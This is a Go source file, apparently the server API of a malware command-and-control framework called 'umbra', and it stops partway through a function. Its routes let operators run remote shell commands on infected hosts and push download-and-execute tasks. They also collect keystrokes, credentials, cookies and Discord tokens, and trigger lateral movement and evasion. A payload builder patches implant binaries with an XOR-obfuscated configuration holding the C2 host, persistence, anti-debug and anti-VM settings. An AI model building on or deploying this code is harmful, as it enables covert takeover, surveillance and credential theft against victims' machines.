package api

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/jmoiron/sqlx"

	"chemicalumbra.dev/server/pkg/agent"
	"chemicalumbra.dev/server/pkg/filetransfer"
	"chemicalumbra.dev/server/pkg/task"
	"chemicalumbra.dev/server/pkg/ws"
)

// db is the shared handle for handlers that need raw queries
// (e.g. screenshot download) without a dedicated manager.
var db *sqlx.DB

// SetDB wires the shared database handle. Called once at startup.
func SetDB(d *sqlx.DB) {
	db = d
}

func RegisterRoutes(r *gin.Engine, agentMgr *agent.Manager, taskQueue *task.Queue, fileMgr *filetransfer.Manager, lateralMgr interface{}, evasionMgr interface{}, wsHub *ws.Hub, config interface{}) {
	api := r.Group("/api")
	{
		// Auth
		api.POST("/auth/login", loginHandler)
		api.POST("/auth/register", registerHandler)
		api.POST("/auth/logout", logoutHandler)
		api.GET("/auth/me", meHandler)
		api.GET("/operators", listOperatorsHandler)
		api.GET("/operators/:id", getOperatorHandler)

		// Agents
		api.GET("/agents", getAgentsHandler(agentMgr))
		api.GET("/agents/:id", getAgentHandler(agentMgr))
		api.DELETE("/agents/:id", deleteAgentHandler(agentMgr))
		api.PATCH("/agents/:id", updateAgentHandler(agentMgr))
		api.POST("/agents/:id/shell", executeShellHandler(taskQueue))
		api.POST("/agents/:id/screenshot", takeScreenshotHandler(taskQueue))
		api.POST("/agents/:id/sleep", sleepHandler(taskQueue))
		api.POST("/agents/:id/uninstall", uninstallHandler(taskQueue))
		api.POST("/agents/:id/update", updateAgentBinaryHandler(taskQueue))

		// Tasks
		api.GET("/agents/:id/tasks", getTasksHandler(taskQueue))
		api.GET("/tasks/:id", getTaskHandler(taskQueue))
		api.POST("/tasks/:id/cancel", cancelTaskHandler(taskQueue))

		// File Transfers
		api.GET("/agents/:id/files", getFileTransfersHandler(fileMgr))
		api.POST("/agents/:id/files/upload", uploadFileHandler(fileMgr))
		api.POST("/agents/:id/files/download", downloadFileHandler(fileMgr, taskQueue))
		api.POST("/agents/:id/files/download_exec", downloadExecHandler(fileMgr, taskQueue))
		api.GET("/agents/:id/files/list", listDirectoryHandler(fileMgr))
		api.GET("/files/:id/download", downloadStoredFileHandler(fileMgr))
		api.DELETE("/files/:id", deleteFileTransferHandler(fileMgr))

		// Payload Builder
		api.POST("/payloads/build", buildPayloadHandler(fileMgr))
		api.POST("/payloads/upload", uploadAgentBinaryHandler(fileMgr))
		api.GET("/payloads/history", getPayloadHistoryHandler(fileMgr))
		api.GET("/payloads/:id/download", downloadPayloadHandler(fileMgr))
		api.DELETE("/payloads/:id", deletePayloadHandler(fileMgr))

		// Credentials
		api.GET("/agents/:id/credentials", getCredentialsHandler)
		api.GET("/agents/:id/cookies", getCookiesHandler)
		api.GET("/agents/:id/discord", getDiscordTokensHandler)
		api.GET("/agents/:id/keystrokes", getKeystrokesHandler)

		// Screenshots
		api.GET("/agents/:id/screenshots", getScreenshotsHandler)
		api.GET("/screenshots/:id/download", downloadScreenshotHandler)
		api.DELETE("/screenshots/:id", deleteScreenshotHandler)

		// Lateral Movement
		api.POST("/agents/:id/lateral", executeLateralHandler(lateralMgr))

		// Evasion
		api.POST("/agents/:id/evasion", executeEvasionHandler(evasionMgr))

		// Modules
		api.GET("/modules", getModulesHandler)
		api.POST("/modules/load", loadModuleHandler)
		api.POST("/modules/unload", unloadModuleHandler)
	}

	// Agent HTTP beacon endpoints (for the hardened C++ Windows agent).
	// Separate from WebSocket /ws/agent used by the Rust Linux agent.
	r.POST("/agent", agentHTTPBeaconHandler(agentMgr))
	r.POST("/beacon", agentHTTPDataTaskHandler(agentMgr, taskQueue))

	// Health on the public API port — Railway/Render hit this via $PORT.
	r.GET("/health", func(c *gin.Context) {
		c.String(http.StatusOK, "OK")
	})

	// Agent WS on the same public port (Railway only exposes one).
	// Path is /ws/agent so it never collides with POST /agent.
	if wsHub != nil {
		r.GET("/ws/agent", gin.WrapH(http.HandlerFunc(wsHub.HandleAgentWS)))
		r.GET("/ws", gin.WrapH(http.HandlerFunc(wsHub.HandleOperatorWS)))
	}
}

func agentHTTPDataTaskHandler(agentMgr *agent.Manager, taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		var msg struct {
			Type     string `json:"type"`
			HwID     string `json:"hw_id"`
			Data     string `json:"data"`
			Title    string `json:"window_title"`
			TaskID   string `json:"task_id"`
			Code     int    `json:"code"`
			Output   string `json:"output"`
		}
		if err := c.ShouldBindJSON(&msg); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON"})
			return
		}
		a, ok := agentMgr.GetByHwID(msg.HwID)
		if !ok {
			c.JSON(http.StatusNotFound, gin.H{"error": "unknown agent"})
			return
		}
		agentMgr.UpdateLastSeen(a.ID)

		switch msg.Type {
		case "result":
			if taskQueue != nil && msg.TaskID != "" {
				_ = taskQueue.UpdateResult(msg.TaskID, msg.Output, msg.Code)
				status := "completed"
				if msg.Code != 0 {
					status = "failed"
				}
				_ = taskQueue.UpdateStatus(msg.TaskID, status)
				taskQueue.HandleResult(msg.TaskID, msg.Output, msg.Code)
			}
			c.JSON(http.StatusOK, gin.H{"status": "ok"})
			return
		case "keystrokes":
			if db == nil {
				log.Printf("[Beacon] db is nil — dropping keystrokes from %s", a.ID)
			} else {
				res, err := db.Exec(`INSERT INTO keystrokes (agent_id, window_title, keys) VALUES (?, ?, ?)`,
					a.ID, msg.Title, msg.Data)
				if err != nil {
					log.Printf("[Beacon] keystroke insert: %v", err)
				} else {
					if aff, _ := res.RowsAffected(); aff == 0 {
						log.Printf("[Beacon] keystroke insert affected=0 agent=%s", a.ID)
					}
				}
			}
		}

		var pending []map[string]any
		if taskQueue != nil {
			tasks, err := taskQueue.GetPending(a.ID)
			if err == nil {
				for _, t := range tasks {
					_ = taskQueue.UpdateStatus(t.ID, "sent")
					pending = append(pending, map[string]any{
						"id":      t.ID,
						"command": t.Command,
						"args":    t.Args,
					})
				}
			}
		}
		if pending == nil {
			pending = []map[string]any{}
		}
		c.JSON(http.StatusOK, gin.H{"status": "ok", "tasks": pending})
	}
}

func logoutHandler(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"message": "Logged out"})
}

func getAgentsHandler(agentMgr *agent.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		agents := agentMgr.List()
		c.JSON(http.StatusOK, agents)
	}
}

func getAgentHandler(agentMgr *agent.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		a, ok := agentMgr.Get(id)
		if !ok {
			c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
			return
		}
		c.JSON(http.StatusOK, a)
	}
}

func deleteAgentHandler(agentMgr *agent.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		agentMgr.Remove(id)
		c.JSON(http.StatusOK, gin.H{"message": "Agent removed"})
	}
}

func updateAgentHandler(agentMgr *agent.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		var updates map[string]interface{}
		if err := c.ShouldBindJSON(&updates); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		a, ok := agentMgr.Get(id)
		if !ok {
			c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
			return
		}
		// Apply updates (simplified)
		c.JSON(http.StatusOK, a)
	}
}

func executeShellHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		var req struct {
			Command string `json:"command" binding:"required"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		t, _ := taskQueue.EnqueueShell(agentID, req.Command, 0)
		c.JSON(http.StatusOK, t)
	}
}

func takeScreenshotHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		t, _ := taskQueue.EnqueueScreenshot(agentID, 0)
		c.JSON(http.StatusOK, t)
	}
}

func sleepHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		var req struct {
			Seconds int `json:"seconds" binding:"required"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		t, _ := taskQueue.EnqueueSleep(agentID, req.Seconds, 0)
		c.JSON(http.StatusOK, t)
	}
}

func uninstallHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		t, _ := taskQueue.EnqueueUninstall(agentID, 0)
		c.JSON(http.StatusOK, t)
	}
}

func updateAgentBinaryHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		var req struct {
			URL string `json:"url" binding:"required"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		t, _ := taskQueue.EnqueueUpdate(agentID, req.URL, 0)
		c.JSON(http.StatusOK, t)
	}
}

func getTasksHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		tasks, err := taskQueue.GetByAgent(agentID, 100)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, tasks)
	}
}

func getTaskHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		t, err := taskQueue.Get(id)
		if err != nil {
			c.JSON(http.StatusNotFound, gin.H{"error": "Task not found"})
			return
		}
		c.JSON(http.StatusOK, t)
	}
}

func cancelTaskHandler(taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		taskQueue.Cancel(id)
		c.JSON(http.StatusOK, gin.H{"message": "Task cancelled"})
	}
}

func getFileTransfersHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		transfers, err := fileMgr.GetByAgent(agentID)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, transfers)
	}
}

func uploadFileHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		file, err := c.FormFile("file")
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "No file uploaded"})
			return
		}
		remotePath := c.PostForm("remote_path")
		if remotePath == "" {
			remotePath = file.Filename
		}

		src, err := file.Open()
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to open uploaded file"})
			return
		}
		defer src.Close()

		ft, err := fileMgr.CreateUpload(agentID, file.Filename, remotePath, file.Size)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		dst, err := os.Create(ft.TempPath)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create temp file"})
			return
		}
		defer dst.Close()

		written, err := io.Copy(dst, src)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to write file"})
			return
		}

		ft.Size = written
		ft.Status = "completed"
		now := time.Now()
		ft.CompletedAt = &now

		// Update in database
		fileMgr.GetDB().Exec(`UPDATE files SET size = ?, status = ?, completed_at = ? WHERE id = ?`, ft.Size, ft.Status, ft.CompletedAt, ft.ID)

		c.JSON(http.StatusOK, ft)
	}
}

func downloadFileHandler(fileMgr *filetransfer.Manager, taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		var req struct {
			RemotePath string `json:"remote_path" binding:"required"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}

		ft, err := fileMgr.CreateDownload(agentID, req.RemotePath, req.RemotePath)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		t, err := taskQueue.EnqueueDownload(agentID, req.RemotePath, ft.TempPath, 10)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		c.JSON(http.StatusOK, gin.H{
			"file_transfer": ft,
			"task":          t,
		})
	}
}

func downloadExecHandler(fileMgr *filetransfer.Manager, taskQueue *task.Queue) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		var req struct {
			URL  string `json:"url" binding:"required"`
			Args string `json:"args"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}

		ft, err := fileMgr.CreateDownloadExec(agentID, req.URL, req.Args)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		t, err := taskQueue.EnqueueDownloadExec(agentID, req.URL, req.Args, 10)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		log.Printf("[API] Created download_exec task for agent %s: %s -> %s", agentID, req.URL, ft.TempPath)

		c.JSON(http.StatusOK, gin.H{
			"file_transfer": ft,
			"task":          t,
		})
	}
}

func listDirectoryHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		agentID := c.Param("id")
		path := c.DefaultQuery("path", "C:\\")
		entries, err := fileMgr.ListDirectory(agentID, path)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, entries)
	}
}

func downloadStoredFileHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		ft, err := fileMgr.Get(id)
		if err != nil {
			c.JSON(http.StatusNotFound, gin.H{"error": "File not found"})
			return
		}

		c.Header("Content-Description", "File Transfer")
		c.Header("Content-Transfer-Encoding", "binary")
		c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", ft.Filename))
		c.Header("Content-Type", "application/octet-stream")
		c.File(ft.TempPath)
	}
}

func deleteFileTransferHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		fileMgr.Delete(id)
		c.JSON(http.StatusOK, gin.H{"message": "File transfer deleted"})
	}
}

func getCredentialsHandler(c *gin.Context) {
	c.JSON(http.StatusOK, []interface{}{})
}

func getCookiesHandler(c *gin.Context) {
	c.JSON(http.StatusOK, []interface{}{})
}

func getDiscordTokensHandler(c *gin.Context) {
	c.JSON(http.StatusOK, []interface{}{})
}

func getKeystrokesHandler(c *gin.Context) {
	agentID := c.Param("id")
	if db == nil {
		c.JSON(http.StatusOK, []interface{}{})
		return
	}
	type KS struct {
		ID        int64  `json:"id" db:"id"`
		Window    string `json:"window_title" db:"window_title"`
		Keys      string `json:"keys" db:"keys"`
		CreatedAt string `json:"created_at" db:"timestamp"`
	}
	var rows []KS
	err := db.Select(&rows, `SELECT id, window_title, keys, timestamp FROM keystrokes WHERE agent_id = ? ORDER BY timestamp DESC LIMIT 500`, agentID)
	if err != nil {
		log.Printf("[api] keystrokes select: %v", err)
		c.JSON(http.StatusOK, []interface{}{})
		return
	}
	c.JSON(http.StatusOK, rows)
}

func getScreenshotsHandler(c *gin.Context) {
	c.JSON(http.StatusOK, []interface{}{})
}

func downloadScreenshotHandler(c *gin.Context) {
	id := c.Param("id")
	var shot struct {
		Filename string `db:"filename"`
		FilePath string `db:"file_path"`
	}
	err := db.Get(&shot, "SELECT filename, file_path FROM screenshots WHERE id = ?", id)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Screenshot not found"})
		return
	}

	path := shot.FilePath
	if path == "" {
		// Fallback: derive from configured storage root
		path = filepath.Join("data", "screenshots", id+".png")
	}
	if _, statErr := os.Stat(path); os.IsNotExist(statErr) {
		c.JSON(http.StatusNotFound, gin.H{"error": "Screenshot file not found on disk"})
		return
	}

	fn := shot.Filename
	if fn == "" {
		fn = id + ".png"
	}
	c.Header("Content-Description", "File Transfer")
	c.Header("Content-Transfer-Encoding", "binary")
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", fn))
	c.Header("Content-Type", "image/png")
	c.File(path)
}

func deleteScreenshotHandler(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"message": "Screenshot deleted"})
}

func executeLateralHandler(lateralMgr interface{}) gin.HandlerFunc {
	return func(c *gin.Context) {
		var req struct {
			Technique string                 `json:"technique" binding:"required"`
			Target    string                 `json:"target" binding:"required"`
			Options   map[string]interface{} `json:"options"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, gin.H{"message": "Lateral movement task created"})
	}
}

func executeEvasionHandler(evasionMgr interface{}) gin.HandlerFunc {
	return func(c *gin.Context) {
		var req struct {
			Technique string                 `json:"technique" binding:"required"`
			Options   map[string]interface{} `json:"options"`
		}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, gin.H{"message": "Evasion task created"})
	}
}

func getModulesHandler(c *gin.Context) {
	c.JSON(http.StatusOK, []interface{}{})
}

func loadModuleHandler(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"message": "Module loaded"})
}

func unloadModuleHandler(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"message": "Module unloaded"})
}

// Payload Builder handlers
type PayloadRecord struct {
	ID        string    `json:"id" db:"id"`
	Filename  string    `json:"filename" db:"filename"`
	Size      int64     `json:"size" db:"size"`
	Status    string    `json:"status" db:"status"`
	CreatedAt time.Time `json:"created_at" db:"created_at"`
	TempPath  string    `json:"-" db:"temp_path"`
	Config    string    `json:"config" db:"config"`
}

func buildPayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		ct := c.ContentType()
		cfg := PayloadConfig{}
		var exeBytes []byte
		filename := "agent.exe"

		if strings.Contains(ct, "multipart/form-data") {
			if err := c.Request.ParseMultipartForm(300 << 20); err != nil {
				c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to parse form"})
				return
			}
			file, header, err := c.Request.FormFile("binary")
			if err == nil {
				defer file.Close()
				filename = header.Filename
				exeBytes, err = io.ReadAll(file)
				if err != nil {
					c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read binary"})
					return
				}
			}
			cfg = PayloadConfig{
				C2Host:          c.PostForm("c2_host"),
				C2Port:          c.PostForm("c2_port"),
				UseTLS:          c.PostForm("use_tls") == "true",
				Key:             c.PostForm("key"),
				HMACKey:         c.PostForm("hmac_key"),
				SleepInterval:   parseInt(c.PostForm("sleep_interval"), 180),
				Jitter:          parseInt(c.PostForm("jitter"), 40),
				Persistence:     c.PostForm("persistence") == "true",
				HideConsole:     c.PostForm("hide_console") != "false",
				AntiDebug:       c.PostForm("anti_debug") == "true",
				AntiVM:          c.PostForm("anti_vm") == "true",
				InjectionMethod: c.PostForm("injection_method"),
				Platform:        c.PostForm("platform"),
			}
			applyCustomConfig(&cfg, c.PostForm("custom_config"))
			normalizePayloadTLS(&cfg)
		} else {
			var body struct {
				ServerHost        string `json:"ServerHost"`
				ServerPort        int    `json:"ServerPort"`
				C2Host            string `json:"c2_host"`
				C2Port            any    `json:"c2_port"`
				Platform          string `json:"Platform"`
				Arch              string `json:"Arch"`
				Obfuscation       bool   `json:"Obfuscation"`
				AntiDebug         bool   `json:"AntiDebug"`
				AntiVM            bool   `json:"AntiVM"`
				SleepObfuscation  bool   `json:"SleepObfuscation"`
				EncryptionKey     string `json:"EncryptionKey"`
				UseTLS            *bool  `json:"use_tls"`
				CustomConfig      string `json:"CustomConfig"`
			}
			if err := c.ShouldBindJSON(&body); err != nil {
				c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON: " + err.Error()})
				return
			}
			host := body.C2Host
			if host == "" {
				host = body.ServerHost
			}
			port := body.ServerPort
			if port == 0 {
				switch v := body.C2Port.(type) {
				case float64:
					port = int(v)
				case string:
					port = parseInt(v, 443)
				}
			}
			if port == 0 {
				port = 443
			}
			useTLS := port == 443
			if body.UseTLS != nil {
				useTLS = *body.UseTLS
			}
			cfg = PayloadConfig{
				C2Host:        host,
				C2Port:        strconv.Itoa(port),
				UseTLS:        useTLS,
				Key:           body.EncryptionKey,
				SleepInterval: 180,
				Jitter:        40,
				HideConsole:   true,
				AntiDebug:     body.AntiDebug,
				AntiVM:        body.AntiVM,
				Platform:      body.Platform,
			}
			applyCustomConfig(&cfg, body.CustomConfig)
			normalizePayloadTLS(&cfg)
			if cfg.Platform == "" {
				cfg.Platform = "windows"
			}
			filename = "umbra-" + cfg.Platform + ".exe"
			if cfg.Platform == "linux" {
				filename = "umbra-linux"
			}
		}

		if cfg.Platform == "" {
			cfg.Platform = "windows"
		}
		isLinux := cfg.Platform == "linux"
		if cfg.C2Host == "" {
			c.JSON(http.StatusBadRequest, gin.H{"error": "C2 host is required"})
			return
		}

		if len(exeBytes) == 0 {
			baseName := "agent.exe"
			if isLinux {
				baseName = "agent"
			}
			root := writableRoot(fileMgr.GetStoragePath())
			candidates := []string{
				filepath.Join(root, baseName),
				filepath.Join(root, "agent.exe"),
				filepath.Join(fileMgr.GetStoragePath(), baseName),
				filepath.Join(fileMgr.GetStoragePath(), "agent.exe"),
				"./data/files/" + baseName,
			}
			for _, p := range candidates {
				b, err := os.ReadFile(p)
				if err == nil && len(b) > 0 {
					exeBytes = b
					if filename == "agent.exe" || strings.HasPrefix(filename, "umbra-") {
						filename = filepath.Base(p)
					}
					break
				}
			}
		}
		if len(exeBytes) == 0 {
			c.JSON(http.StatusBadRequest, gin.H{
				"error":   "No agent binary on the server. Upload one in Advanced, then Build.",
				"Success": false,
				"Error":   "No agent binary on the server. Upload one in Advanced, then Build.",
			})
			return
		}

		payloadID := uuid.New().String()
		ext := ".exe"
		if isLinux {
			ext = ""
		}
		root := writableRoot(fileMgr.GetStoragePath())
		tempPath := filepath.Join(root, "payloads", payloadID+ext)

		exeBytes = stripExistingTrailer(exeBytes)
		configJSON := marshalTrailer(cfg)
		var lenBuf [4]byte
		binary.LittleEndian.PutUint32(lenBuf[:], uint32(len(configJSON)))
		magic := trailerMagic()
		enc := make([]byte, len(configJSON))
		for i, b := range configJSON {
			enc[i] = b ^ byte(0x5A+(12+i))
		}
		trailer := append(append(magic, lenBuf[:]...), enc...)
		patched := append(exeBytes, trailer...)
		if !verifyTrailer(patched, configJSON) {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "trailer checksum failed", "Success": false, "Error": "trailer checksum failed"})
			return
		}
		if err := os.MkdirAll(filepath.Dir(tempPath), 0755); err == nil {
			_ = os.WriteFile(tempPath, patched, 0644)
		}
		written := int64(len(patched))

		if _, err := fileMgr.GetDB().Exec(`
			INSERT INTO payloads (id, filename, size, status, temp_path, config, created_at)
			VALUES (?, ?, ?, 'completed', ?, ?, ?)
		`, payloadID, filename, written, tempPath, string(configJSON), time.Now()); err != nil {
			log.Printf("[Payload] DB insert error: %v", err)
		}

		sum := fmt.Sprintf("%x", sha256.Sum256(patched))
		c.JSON(http.StatusOK, gin.H{
			"id":          payloadID,
			"filename":    filename,
			"url":         fmt.Sprintf("/api/payloads/%s/download", payloadID),
			"Success":     true,
			"BinaryPath":  tempPath,
			"BinaryName":  filename,
			"Size":        written,
			"Checksum":    sum,
			"Error":       "",
			"DownloadB64": base64.StdEncoding.EncodeToString(patched),
		})
	}
}

func uploadAgentBinaryHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		if err := c.Request.ParseMultipartForm(300 << 20); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Failed to parse form"})
			return
		}
		file, header, err := c.Request.FormFile("file")
		if err != nil {
			file, header, err = c.Request.FormFile("binary")
		}
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "No file provided"})
			return
		}
		defer file.Close()
		platform := c.PostForm("platform")
		if platform == "" {
			platform = "windows"
		}
		name := "agent.exe"
		if platform == "linux" {
			name = "agent"
		}
		dest := filepath.Join(writableRoot(fileMgr.GetStoragePath()), name)
		if err := os.MkdirAll(filepath.Dir(dest), 0755); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create storage"})
			return
		}
		b, err := io.ReadAll(file)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read upload"})
			return
		}
		if err := os.WriteFile(dest, b, 0644); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to store binary"})
			return
		}
		c.JSON(http.StatusOK, gin.H{"success": true, "path": dest, "filename": header.Filename, "size": len(b)})
	}
}

type PayloadConfig struct {
	C2Host         string `json:"c2_host"`
	C2Port         string `json:"c2_port"`
	UseTLS         bool   `json:"use_tls"`
	Key            string `json:"key"`
	HMACKey        string `json:"hmac_key"`
	SleepInterval  int    `json:"sleep_interval"`
	Jitter         int    `json:"jitter"`
	Persistence    bool   `json:"persistence"`
	HideConsole    bool   `json:"hide_console"`
	AntiDebug      bool   `json:"anti_debug"`
	AntiVM         bool   `json:"anti_vm"`
	InjectionMethod string `json:"injection_method"`
	Platform       string `json:"platform"` // "windows" or "linux"
}

func writableRoot(preferred string) string {
	candidates := []string{preferred, os.TempDir(), "/tmp"}
	for _, p := range candidates {
		if p == "" {
			continue
		}
		dir := filepath.Join(p, "payloads")
		if err := os.MkdirAll(dir, 0755); err == nil {
			return p
		}
	}
	return os.TempDir()
}

func normalizePayloadTLS(cfg *PayloadConfig) {
	if cfg.C2Port == "443" {
		cfg.UseTLS = true
	}
}

func applyCustomConfig(cfg *PayloadConfig, raw string) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return
	}
	var extra map[string]any
	if err := json.Unmarshal([]byte(raw), &extra); err != nil {
		return
	}
	str := func(keys ...string) string {
		for _, k := range keys {
			if v, ok := extra[k]; ok {
				switch t := v.(type) {
				case string:
					if t != "" {
						return t
					}
				case float64:
					return strconv.Itoa(int(t))
				case bool:
					if t {
						return "true"
					}
					return "false"
				}
			}
		}
		return ""
	}
	if v := str("c2_host", "ServerHost", "host"); v != "" {
		cfg.C2Host = v
	}
	if v := str("c2_port", "ServerPort", "port"); v != "" {
		cfg.C2Port = v
	}
	if v := str("use_tls", "useTLS"); v != "" {
		cfg.UseTLS = v == "true" || v == "1"
	}
	if v := str("sleep_interval", "beacon_interval", "sleep"); v != "" {
		cfg.SleepInterval = parseInt(v, cfg.SleepInterval)
		if cfg.SleepInterval > 1000 {
			cfg.SleepInterval = cfg.SleepInterval / 1000
		}
	}
	if v := str("jitter"); v != "" {
		cfg.Jitter = parseInt(v, cfg.Jitter)
		if cfg.Jitter > 0 && cfg.Jitter < 1 {
			cfg.Jitter = int(parseFloat(v) * 100)
		}
	}
	if v := str("persistence"); v != "" {
		cfg.Persistence = v == "true" || v == "1"
	}
	if v := str("hide_console"); v != "" {
		cfg.HideConsole = v == "true" || v == "1"
	}
	if v := str("key", "EncryptionKey"); v != "" {
		cfg.Key = v
	}
	if v := str("anti_debug", "AntiDebug"); v != "" {
		cfg.AntiDebug = v == "true" || v == "1"
	}
	if v := str("anti_vm", "AntiVM"); v != "" {
		cfg.AntiVM = v == "true" || v == "1"
	}
	if v := str("injection_method", "InjectionMethod"); v != "" {
		cfg.InjectionMethod = v
	}
}

func parseFloat(s string) float64 {
	f, err := strconv.ParseFloat(s, 64)
	if err != nil {
		return 0
	}
	return f
}

func trailerMagic() []byte {
	return []byte{0x61, 0x72, 0x67, 0x70, 0x01, 0x70, 0x75, 0x74}
}

func stripExistingTrailer(b []byte) []byte {
	magic := trailerMagic()
	n := len(b)
	if n < 12 {
		return b
	}
	window := 8192
	if window > n {
		window = n
	}
	for off := 8; off <= window; off++ {
		i := n - off
		if i+12 > n {
			continue
		}
		if !bytes.Equal(b[i:i+8], magic) {
			continue
		}
		ln := int(binary.LittleEndian.Uint32(b[i+8 : i+12]))
		if ln > 0 && ln <= 8192 && i+12+ln <= n {
			return b[:i]
		}
	}
	return b
}

func decryptTrailerJSON(patched []byte) ([]byte, bool) {
	magic := trailerMagic()
	n := len(patched)
	if n < 12 {
		return nil, false
	}
	window := 8192
	if window > n {
		window = n
	}
	for off := 8; off <= window; off++ {
		i := n - off
		if i+12 > n {
			continue
		}
		if !bytes.Equal(patched[i:i+8], magic) {
			continue
		}
		ln := int(binary.LittleEndian.Uint32(patched[i+8 : i+12]))
		if ln <= 0 || ln > 8192 || i+12+ln > n {
			continue
		}
		enc := patched[i+12 : i+12+ln]
		out := make([]byte, ln)
		for j, b := range enc {
			out[j] = b ^ byte(0x5A+(12+j))
		}
		return out, true
	}
	return nil, false
}

func verifyTrailer(patched, want []byte) bool {
	got, ok := decryptTrailerJSON(patched)
	return ok && bytes.Equal(got, want)
}

func marshalTrailer(cfg PayloadConfig) []byte {
	// C++ jval only matches "key":"value" — numbers and bools are invisible.
	port := cfg.C2Port
	if port == "" {
		port = "443"
	}
	sleep := cfg.SleepInterval
	if sleep <= 0 {
		sleep = 180
	}
	jit := cfg.Jitter
	if jit < 0 {
		jit = 40
	}
	tf := func(v bool) string {
		if v {
			return "true"
		}
		return "false"
	}
	esc := func(s string) string {
		b, _ := json.Marshal(s)
		return string(b)
	}
	inj := cfg.InjectionMethod
	if inj == "" {
		inj = "none"
	}
	return []byte(fmt.Sprintf(
